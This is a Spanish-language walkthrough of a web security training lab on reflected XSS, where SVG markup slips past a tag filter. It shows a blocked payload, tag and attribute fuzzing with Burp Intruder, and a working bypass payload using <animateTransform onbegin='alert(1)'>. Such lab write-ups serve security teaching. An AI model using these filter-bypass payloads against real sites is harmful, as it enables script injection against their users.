# Lab: Reflected XSS with some SVG markup allowed

This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the `alert()` function.

---

Intentamos inyectar un payload típico pero el WAF nos bloquea:
```html
<img src=1 onerror=alert(1)>
```
![image](https://github.com/user-attachments/assets/f90767f5-53f2-48fb-88fd-4fd7a54b04e9)

Realizamos un `Sniper Attack` con `Burpsuite Intruder` para averiguar qué etiquetas son permitidas por el WAF:
![image](https://github.com/user-attachments/assets/5ef5442b-df2c-4d8d-85f3-515c20729ed4)

![image](https://github.com/user-attachments/assets/5a72489f-0666-40ad-b393-78140b4a6381)

## 🌀 Análisis `<animateTransform>`

`<animateTransform>` es una etiqueta SVG que permite **animar transformaciones** en un elemento SVG, como:

- 🔄 **Rotar** (`rotate`)
- 🔍 **Escalar** (`scale`)
- 🧭 **Mover** (`translate`)
- 📐 **Inclinar** (`skewX`, `skewY`)

Se usa dentro de elementos SVG como `<rect>`, `<circle>`, `<g>`, etc., para crear efectos visuales dinámicos.

### 🧪 Ejemplo básico

```html
<svg>
  <rect width="100" height="100" fill="blue">
    <animateTransform 
      attributeName="transform"
      type="rotate"
      from="0 50 50"
      to="360 50 50"
      dur="5s"
      repeatCount="indefinite" />
  </rect>
</svg>
```
Hacemos un `Sniper Attack` para ver qué atributos podemos utilizar con `animateTransform`:
![image](https://github.com/user-attachments/assets/f8708389-255b-4f2d-b041-3a36f7f796fb)

![image](https://github.com/user-attachments/assets/2d586a17-9504-45c4-a5c1-e10a6964b462)

`onbegin` es un **evento SVG** que se dispara cuando una animación **comienza**. Es útil para ataques XSS porque permite ejecutar código JavaScript **automáticamente**, sin interacción del usuario.

Entonces probamos el siguiente payload:
```html
<svg><animateTransform onbegin='alert(1)'>
```
![image](https://github.com/user-attachments/assets/0020529e-e873-4cac-ba00-3ecfb19bae6f)
![image](https://github.com/user-attachments/assets/313438fd-30d4-4de4-9f9b-cac2b76d6dbe)



